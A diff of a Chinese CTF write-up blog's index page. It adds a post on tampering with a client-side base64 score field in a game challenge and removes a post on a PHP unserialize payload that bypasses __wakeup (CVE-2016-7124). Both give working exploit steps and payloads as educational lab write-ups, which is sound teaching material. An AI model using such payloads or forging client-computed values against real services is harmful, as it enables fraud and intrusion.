@@ -18,7 +18,7 @@
         <link rel="prev" href="../knowledge/audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-PHP%E4%B8%8EJava/">
       
       
-        <link rel="next" href="category/php-%E6%BA%90%E7%A0%81/">
+        <link rel="next" href="category/js/">
       
       
         
@@ -1773,6 +1773,12 @@
       
         
       
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1820,6 +1826,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="category/js/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2190,6 +2226,36 @@
   
   
     <li class="md-nav__item">
+      <a href="category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    客户端信任
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-nav__link">
         
   
@@ -2288,6 +2354,36 @@
     
   
     新手入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逻辑漏洞
   
 
     
@@ -2716,6 +2812,132 @@
 </span></code></pre></div>
 <p><strong>我在本地 PHP 7.4 上实测确认过：<code>intval('2025e9')</code> 返回 <code>2025000000000</code>，第一个条件就直接不成立。</strong></p>
 <p><strong>所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。</strong></p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-28 00:00:00+00:00">2026-10-28</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-meta__link">客户端信任</a>, 
+              <a href="category/js/" class="md-meta__link">JS</a>, 
+              <a href="category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="md-meta__link">逻辑漏洞</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage3"><a class="toclink" href="zerog2026-stage3/">Stage3 — 重生之我在零重力屋顶当"卷王"</a></h2>
+<p>题目是个小游戏：控制碰星娘飞过星环，<strong>攒到 3000 分</strong>才能领终点奖励。</p>
+<h3 id="f12"><a class="toclink" href="zerog2026-stage3/#f12">做这种题的第一步：F12</a></h3>
+<p><strong>做这种类型的题目，重要的是打开 F12、打开 Network，先玩一局，看它都发送了哪些请求。</strong></p>
+<p><img alt="Network 面板" src="../assets/images/zerog2026-stage3/01-network.png" /></p>
+<p>一局下来就两个请求：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>POST /api/run     201    开局
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>POST /api/claim   403    结算
+</span></code></pre></div>
+<h3 id="claim"><a class="toclink" href="zerog2026-stage3/#claim">盯住 claim</a></h3>
+<p><code>claim</code> 出现了 <code>grades</code> 这个字段，<strong>对其进行 base64 解码</strong>：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>eyJzY29yZSI6MH0=   →   {"score":0}
+</span></code></pre></div>
+<p><strong>这不就是我的得分吗？那这里就明确了。</strong></p>
+<p><img alt="claim 的请求体" src="../assets/images/zerog2026-stage3/02-request.png" /></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span><span class="nt">"runId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"9b337580-62ae-4e0a-9a90-96a5e17095ad"</span><span class="p">,</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="nt">"grades"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eyJzY29yZSI6MH0="</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>分数是浏览器自己算出来、自己 base64 一下、再交给服务器的 —— 服务器完全相信这个数字。</strong></p>
+<p><strong>base64 只是编码，不是加密，也不是签名。</strong></p>
+<p><strong>⚠️ 有个先后依赖：<code>/api/run</code> 返回的不只是 <code>runId</code>，还有 <code>expiresInSeconds: 1800</code>（30 分钟有效）。</strong></p>
+<p><strong>所以不能只发 <code>claim</code> —— 得先拿一个有效的 <code>runId</code>，再拿它去结算。</strong></p>
+<h3 id="_1"><a class="toclink" href="zerog2026-stage3/#_1">改分数</a></h3>
+<p><strong>直接修改分数为 3000，再做一次 base64 编码，抓包改掉 <code>grades</code>，发回去：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{"score":3000}  →  eyJzY29yZSI6MzAwMH0=
+</span></code></pre></div>
+<p><strong>成功得到 flag。</strong></p>
+<p><img alt="成功响应" src="../assets/images/zerog2026-stage3/03-flag.png" /></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span><span class="nt">"ok"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span><span class="nt">"code"</span><span class="p">:</span><span class="w"> </span><span class="s2">"TARGET_REACHED"</span><span class="p">,</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">  </span><span class="nt">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"终点信号已解锁"</span><span class="p">,</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span><span class="nt">"score"</span><span class="p">:</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span><span class="nt">"target"</span><span class="p">:</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">  </span><span class="nt">"flag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ZeroG{...}"</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="base64"><a class="toclink" href="zerog2026-stage3/#base64">补充：为什么 base64 挡不住</a></h3>
+<p>这段代码其实自己就写着答案：</p>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">encodeGrades</span><span class="p">(</span><span class="nx">score</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">btoa</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">score</span><span class="w"> </span><span class="p">}));</span><span class="w">   </span><span class="c1">// btoa = base64 编码</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>函数名是 <code>encode</code>，不是 <code>sign</code>。</strong></p>
+<p><strong>这四个词的区别值得记：</strong></p>
+<table>
+<thead>
+<tr>
+<th>词</th>
+<th>含义</th>
+<th>能不能防改</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>encode</code></td>
+<td><strong>编码</strong>（base64、hex、URL）</td>
+<td>❌ 只是换衣服，谁都能脱</td>
+</tr>
+<tr>
+<td><code>encrypt</code></td>
+<td><strong>加密</strong>（AES、RSA）</td>
+<td>✅ 但要密钥</td>
+</tr>
+<tr>
+<td><code>hash</code></td>
+<td><strong>哈希</strong>（md5、sha256）</td>
+<td>✅ 单向，但这里只存不比对</td>
+</tr>
+<tr>
+<td><code>sign</code></td>
+<td><strong>签名</strong>（HMAC、RSA 签名）</td>
+<td>✅ <strong>改了就对不上</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>只有最后一种能真正防篡改 —— 因为它需要服务器持有的密钥，前端拿不到。</strong></p>
+<h3 id="_2"><a class="toclink" href="zerog2026-stage3/#_2">这类题的通法</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>① F12 → Network，玩一局，看发了哪些请求
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>② 找到"提交结果"的那个请求
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>③ 看提交的字段是怎么产生的：
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>     · 明文？          → 直接改
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>     · base64 / hex？  → 编码而已，解开改
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>     · 带签名？        → 找密钥（前端藏了也能拿到）
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>     · 服务器发的 token？→ 看能不能复用
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>④ 这个值是服务器算的，还是浏览器算的？
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>     浏览器算的 → 一定能伪造
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>     服务器算的 → 得去找逻辑漏洞
+</span></code></pre></div>
+<p><strong>这道题属于第 ④ 条最简单的那种：分数完完全全是浏览器算的。</strong></p>
     
     
   </div>
@@ -3588,112 +3810,6 @@ Firefox：存储 → Cookie</p>
   </div>
 </article>
       
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="2019-php"><a class="toclink" href="geek2019-php/">[极客大挑战 2019] PHP</a></h2>
-<p>这道题点进去后，它说有做备份的习惯。查看源代码没啥东西后，使用 dirsearch 开始扫：</p>
-<p><img alt="dirsearch 扫描结果" src="../assets/images/geek2019-php/01-dirsearch.png" /></p>
-<p>发现了 <code>www.zip</code>，下载下来后发现了几个源代码，一个一个查看。</p>
-<h3 id="flagphp"><a class="toclink" href="geek2019-php/#flagphp">先看 flag.php</a></h3>
-<p>里面的 flag 是假的。</p>
-<h3 id="indexphp"><a class="toclink" href="geek2019-php/#indexphp">再看 index.php</a></h3>
-<p>审计发现了参数是 <code>select</code>：</p>
-<p><img alt="index.php" src="../assets/images/geek2019-php/02-index.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">include 'class.php';</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">$select = $_GET['select'];</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">$res = unserialize(@$select);</span>
-</span></code></pre></div>
-<h3 id="classphp"><a class="toclink" href="geek2019-php/#classphp">最后看 class.php</a></h3>
-<p><img alt="class.php" src="../assets/images/geek2019-php/03-class.png" /></p>
-<p>得知需要让 <code>username = admin</code>，<code>password = 100</code>；再反序列化。</p>
-<p><img alt="__destruct 逻辑" src="../assets/images/geek2019-php/04-destruct.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">function __destruct() {</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    if ($this-&gt;password != 100) {</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">        echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="x">        echo "You name is: ";</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">        echo $this-&gt;username; echo "&lt;/br&gt;";</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="x">        echo "You password is: ";</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="x">        echo $this-&gt;password; echo "&lt;/br&gt;";</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="x">        die();</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="x">    }</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="x">    if ($this-&gt;username === 'admin') {</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="x">        global $flag;</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="x">        echo $flag;</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="x">    } else {</span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="x">        echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="x">        die();</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="x">    }</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="x">}</span>
-</span></code></pre></div>
-<h3 id="__wakeup"><a class="toclink" href="geek2019-php/#__wakeup">绕过 <code>__wakeup</code></a></h3>
-<p>先进行序列化：</p>
-<p><img alt="本地生成序列化" src="../assets/images/geek2019-php/05-serialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">$a = new Name('admin', 100);</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">echo serialize($a);</span>
-</span></code></pre></div>
-<p>但是要注意这里的 <code>__wakeup()</code>，它会直接将 <code>username</code> 修改为 <code>guest</code>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">function __wakeup() {</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    $this-&gt;username = 'guest';</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>所以这里必须绕过。利用的办法是：<strong>当序列化串声明的属性个数大于实际属性个数时，会直接跳过 <code>__wakeup()</code></strong>。</p>
-<p>所以这里把属性数由 <code>2</code> 改为 <code>3</code>。</p>
-<div class="admonition note">
-<p class="admonition-title">这个技巧有版本限制</p>
-<p>这是 <strong>CVE-2016-7124</strong>，影响 PHP &lt; 5.6.25 / 7.0.10。</p>
-<p>在 PHP 7.4 上实测：<code>O:4:"Name":3:{...}</code> 会<strong>直接解析失败</strong>（不是跳过 <code>__wakeup</code>，是整个包解析不了）。</p>
-</div>
-<h3 id="00"><a class="toclink" href="geek2019-php/#00">关于 <code>%00</code></a></h3>
-<p>另外，直接将这个复制到 URL 上时，<code>private</code> 属性名两侧的 <code>%00</code> 会被吞掉，所以先进行 URL 编码再放上去，或者放上去之后再自己手补 <code>%00</code>。</p>
-<h3 id="payload"><a class="toclink" href="geek2019-php/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
-</span></code></pre></div>
-<div class="admonition warning">
-<p class="admonition-title"><code>O:4:"Name":3:</code> 后面那个冒号不能丢</p>
-<p>✅ <code>O:4:"Name":3:{...}</code></p>
-<p>❌ <code>O:4:"Name":3{...}</code> ← 少一个冒号，<code>unserialize</code> 直接返回 false</p>
-</div>
-<p>成功得到 flag：</p>
-<p><img alt="拿到 flag" src="../assets/images/geek2019-php/06-flag.png" /></p>
-<h3 id="private-public"><a class="toclink" href="geek2019-php/#private-public">补充：private 和 public 的序列化区别</a></h3>
-<p><strong><code>private</code> 属性下，构造的序列化串是「类名 + 属性名」的形式（别忘了 <code>%00</code>）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>s:14:"\0Name\0username"      ← \0 + Name + \0 + username = 1+4+1+8 = 14
-</span></code></pre></div>
-<p><strong>而 <code>public</code> 方式只是属性名的形式：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>s:8:"username"
-</span></code></pre></div>
-<p><strong><code>protected</code> 则是 <code>\0*\0属性名</code>。</strong></p>
-<p><strong>长度一律按真实字节数算，<code>\0</code> 算 1 个字节 —— 这也是手写 payload 最容易错的地方。</strong></p>
-    
-    
-  </div>
-</article>
-      
       
         
           
@@ -3701,7 +3817,7 @@ Firefox：存储 → Cookie</p>
 
 
 <nav class="md-pagination">
-  <span class="md-pagination__current">1</span> <a class="md-pagination__link" href="page/2/">2</a>
+  <span class="md-pagination__current">1</span> <a class="md-pagination__link" href="page/2/">2</a> <a class="md-pagination__link" href="page/3/">3</a>
 </nav>
         
       
